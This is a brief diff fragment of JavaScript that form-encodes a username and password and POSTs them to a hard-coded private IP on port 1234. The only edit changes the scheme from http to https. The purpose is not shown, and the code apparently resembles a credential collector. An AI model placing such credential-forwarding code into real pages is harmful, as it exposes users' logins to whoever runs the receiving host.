@@ -23,7 +23,7 @@
       var data = "username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password);
 
       var xhr = new XMLHttpRequest();
-      xhr.open("POST", "http://192.168.10.175:1234", true);
+      xhr.open("POST", "https://192.168.10.175:1234", true);
       xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
       xhr.send(data);
 
